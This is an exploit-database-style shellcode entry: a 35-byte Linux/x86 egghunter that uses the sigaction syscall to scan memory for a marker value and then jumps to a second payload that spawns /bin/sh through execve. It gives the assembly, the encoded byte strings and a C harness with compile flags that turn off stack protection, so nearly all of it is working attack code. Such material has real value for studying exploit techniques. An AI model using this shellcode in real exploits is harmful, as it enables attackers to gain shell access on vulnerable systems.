# Exploit Title: Linux/x86 - Egghunter(0x50905090) + sigaction + execve(/bin/sh) Shellcode (35 bytes)
# Author: danf42
# Date: 2020-07-16
# Platform: Linux/x86

/*******************************************************************************
 sigaction(2) approach to egghunting as described in  the paper
 "Safely Searching Process Virtual Address Space" by skape

 The shellcode prepares the registers to start the hunting by clearing the
 direction flag and setting eax, ecx, and edx to 0

Egg value is 0x50905090

global _start

section .text

_start:
    cld                     ; clear the direction flag
    xor ecx, ecx            ; clear ecx
    mul ecx                 ; multiply by ecx, zero out eax and edx
IncPage:
    or cx, 0xfff            ; Align page address
IncAddr:
    inc ecx                 ; Go to next address
    push byte 0x43          ; syscall for sigaction()
    pop eax                 ; Put syscall value into EAX
    int 0x80                ; call sigaction() to check memory location [ECX]
    cmp al, 0xf2            ; Did it return EFAULT, Bad Address
    jz IncPage              ; Skip page if it returned EFAULT
    mov eax, 0x50905090     ; Store EGG in EAX
    mov edi, ecx            ; Move ECX to EDI for scasd operation
    scasd                   ; Check if [EDI] == EAX then increment EDI
    jnz IncAddr             ; Increment address if no match
    scasd                   ; Check if [EDI] == EAX then increment EDI
    jnz IncAddr             ; Increment address if no match
    jmp edi                 ; Jump to EDI (our shellcode) if both eggs are found

POC Shellcode to execute /bin/sh
  xor ecx, ecx      ; clear ecx
  mul ecx           ; mutliply eax by 0
  push eax          ; push eax onto stack
  push 0x68732f2f   ; push ASCII sh// onto stack
  push 0x6e69622f   ; push ASCII nib/ onto stack
  mov ebx, esp      ; push /bin/sh into ebx
  mov al, 0xb       ; mov 11 into lower byte of eax
  int 0x80          ; execute execve syscall

  mov al,0x01       ; move 1 into lower byte of each
  xor ebx,ebx       ; clear ebx
  int 0x80          ; execute exit syscall

To Cmpile:
 gcc sigaction_egghunter.c -fno-stack-protector -z execstack -o sigaction_egghunter

*******************************************************************************/

#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = "\xfc\x31\xc9\xf7\xe1\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char shellcode[] = "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80";

void main()
{
        printf("Egghunter Length: %d\n", strlen(egghunter));
        printf("Shellcode Length: %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())egghunter;

	ret();

}